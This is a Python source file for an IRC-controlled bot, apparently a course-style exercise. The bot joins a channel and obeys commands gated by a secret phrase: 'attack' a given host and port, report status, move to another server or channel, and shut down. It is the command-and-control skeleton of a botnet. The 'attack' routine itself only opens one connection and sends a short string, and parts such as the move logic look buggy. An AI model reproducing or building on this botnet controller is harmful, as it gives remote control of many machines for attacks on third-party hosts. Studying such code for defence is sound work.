import sys
import socket
import random
import time

# argv check
try:
    hostname= sys.argv[1]
    port = int(sys.argv[2])
    channel = sys.argv[3]
    sphrase = sys.argv[4]
except Exception as err:
    print("invalid arguments: python3 bot.py <hostname> <port> <channel> <secret-phrase>")
    sys.exit()



def connect():
    while True:
        botname = "bot"+str(random.randint(0,999999))
        irc.connect((hostname, port))
        msg = "NICK " + botname + "\r\n"
        irc.send(msg.encode())
        msg = "USER "+botname+" * * : bot " + botname +"\r\n"
        irc.send(msg.encode())
        indata = irc.recv(1024)
        inmsg = indata.decode("utf-8").split("\r\n")
        state_code=inmsg[0].split()[1]
        # wait 5s before retrying to coneect
        if state_code != "001":
            time.sleep(5)
            continue
        else:
            if joinChannel(channel):
                break
    return

# join channel
def joinChannel(name):
    msg = "JOIN #" +name+" \r\n"
    irc.send(msg.encode())
    indata = irc.recv(1024)
    inmsg = indata.decode("utf-8").split("\r\n")
    if inmsg[0].split()[1] == "JOIN":
        print("connected")
        return True
    return False
#handles Ping msg
def ping(pingmsg):
    msg = "PONG "+pingmsg
    irc.send(msg.encode())
    print ("PONG!")
    return

#handles shutdown
def shutdown():
    irc.close()
    sys.exit()
    return
#use to handle status command
def status(masterName):
    msg = "PRIVMSG "+masterName+" :Here\r\n"
    irc.send(msg.encode())
    return
#use to attack
def attack(masterName, hostname,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.connect((hostname,int(port)))
        attack = botname+str(atkCounter)
        s.send(attack.encode())
        msg = "PRIVMSG "+masterName+" :success\r\n"
        irc.send(msg.encode())
    except Exception as err:
        msg = "PRIVMSG "+masterName+" :fail, "+str(err)+"\r\n"
        irc.send(msg.encode())
        print(err)
    return
#use to move
def move(hostname1,port1,channel1):
    global irc
    while True:
        # if not the same server connect
        if hostname1 != hostname and port1 != port:
            botname = "bot"+str(random.randint(0,999999))
            irc.connect((hostname1, port1))
            msg = "NICK " + botname + "\r\n"
            irc.send(msg.encode())
            msg = "USER "+botname+" * * : bot " + botname +"\r\n"
            irc.send(msg.encode())
            indata = irc.recv(1024)
            inmsg = indata.decode("utf-8").split("\r\n")
            state_code=inmsg[0].split()[1]
            # wait 5s before retrying to coneect
            if state_code != "001":
                time.sleep(5)
                continue
        else:
            #disconnect from current channel
            msg = "PART #"+channel+"\r\n"
            irc.send(msg.encode())

        if joinChannel(channel1):
            break


    return
# use the listen to chat
def listen():
    global atkCounter
    global hostname
    global port
    global channel
    while True:

        indata = irc.recv(1024)
        inmsg = indata.decode("utf-8").split()
        print(inmsg)
        if 'PING' in inmsg[0]:
            ping(inmsg[1])
            continue
        try:
            masterName = inmsg[0].split("!")[0].replace(":","")

            inPhrase = inmsg[3]
            inCmd = inmsg[4]

            if ":"+sphrase == inPhrase:
                print ("serving master!")
                if inCmd == 'attack':
                    attack(masterName,inmsg[5],int(inmsg[6]))
                    atkCounter += 1
                elif inCmd == 'status':
                    status(masterName)
                elif inCmd == 'move':
                    move(inmsg[5],int(inmsg[6]),inmsg[7])
                    hostname = inmsg[5]
                    port = int(inmsg[6])
                    channel = inmsg[7]
                elif inCmd == 'shutdown':
                    shutdown()

        except Exception as err:
            print(err)
            print("not a valid cmd")
            continue

    return

# main=========================================================================

irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
botname = ""
atkCounter = 0
while True:
    connect()
    listen()
